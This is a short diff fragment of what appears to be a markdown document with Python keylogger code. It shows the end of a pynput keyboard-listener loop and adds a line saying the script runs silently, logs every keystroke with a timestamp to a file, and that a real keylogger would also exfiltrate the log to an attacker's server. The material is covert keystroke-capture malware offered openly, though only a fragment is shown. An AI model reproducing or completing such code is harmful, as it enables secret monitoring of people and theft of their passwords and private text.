@@ -27,3 +27,5 @@ def on_press(key):
 with Listener(on_press=on_press) as listener:
     listener.join()
 ```
+
+This runs silently in the background and logs every keystroke with a timestamp to a file. A real keylogger would also exfiltrate the log file periodically to the attacker's server.
